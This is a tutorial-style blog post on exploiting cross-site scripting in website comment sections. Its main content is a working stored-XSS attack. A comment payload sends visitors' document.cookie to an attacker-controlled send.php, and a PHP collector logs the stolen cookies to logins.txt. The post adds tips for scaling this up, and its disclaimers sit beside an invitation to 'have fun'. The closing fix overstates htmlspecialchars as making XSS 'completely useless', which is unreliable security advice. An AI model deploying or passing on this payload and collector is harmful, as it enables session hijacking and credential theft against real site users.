---
layout: post
title: How to use a XSS vulnerability on a website
---

In this post, we will be discussing XSS and how you use it if it is on a website, do not use what I used for malicious purposes. This is for educational purposes and you shouldn't try this on any website, XSS vulnerabilites have been fixed in every major website. If you need help to fix a XSS vulnerability using PHP look in this article.

# What is XSS
[XSS](https://en.wikipedia.org/wiki/XSS) , (Cross Site Scripting) (named XSS to not be confused with: [CSS](https://en.wikipedia.org/wiki/CSS)) is a quite common vulnerability found in most websites that allow an attacker to execute any code on the website, this can be JavaScript, jQuery, HTML, CSS whatever you name. 

# How does it work?
Lets say, a user wants to publish a comment, like 'Hotdogs are very cool' (example). If they were to put this in a comment form. The HTML code would probably be like this.

```html
<div class="comment">
  <p>Hot dogs are cool</p>
</div>
```

Now this is especially bad because what they could have put is something like this: Hot dogs are <strong>cool</strong> and the browser would think this is part of the page so it would be interepeted like this:
```html
<div class="comment">
  <p>Hot dogs are <strong>cool</strong></p>
</div>
```
Yikes... This pretty much means we can put anything in here that is an html tag.

# Lets Exploit this!
Since we know now we can put any HTML tags, lets put a <script> tag which anything in here would be ran as Javascript. Like this.
```html
  <div class="comment">
    <p>You have just been hacked <script>alert('You have been hacked!!! Be scared!');</script></p>
  </div>
```  
  
This would show an alert pop up saying "You have been hacked!!! Be scared!"

Let's have a little bit of fun with this XSS vulnerability and put something that steals the cookies of a user, sends it to a remote server and put it in our database using PHP.
  
## Setting up the script
We are going to make a logins.txt file and a send.php file.
 
Go into the comment section of the vulnerable app and put this in the comment section
  
```html
  I love cats, hot dogs and meatballs.
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
  var website = "Put your website here with send.php like: https://yourwebsite.com/send.php"

  $.get(website+"?c="+document.cookie, function(data, status){
    if (status == 200) {
      // successfully worked!
    }
  });
</script>
```  
And then put this in your send.php:
  ```php
    <?php
      $content = $_GET["c"];
      file_put_contents("logins.txt", $content, FILE_APPEND);
    ?>
  ```
  
 And you are pretty much done, you can test it out now and do some stuff with it.
 Some things you might want to do is you might want to change it from a file to a MYSQL database (slower) or do POST requests instead of GET requests but oh well. I mean it does the job and sends cookies to a remote server.
  
  I will say this again **DO NOT USE THIS TO STEAL OTHER PEOPLES CREDENTIALS!!** I mean its scummy and idiotic, so dont.
  
  # I want to fix this on my website.
  If you want to patch this up and prevent lots of accounts getting leaked all you need to do is add this to when it is getting added to the database:
  ```php
    htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
  ```
  This basically will put this in a filter and make it so XSS is completely useless.
  
# Conclusion
This is a very fun vulnerabilty to play with if you want to do some stuff on your server. If you find this you could either report it or abuse it and possibly go to jail. So yeah. Thanks for reading my post and if you liked it or not or something doesn't work, please use the comment section.
  
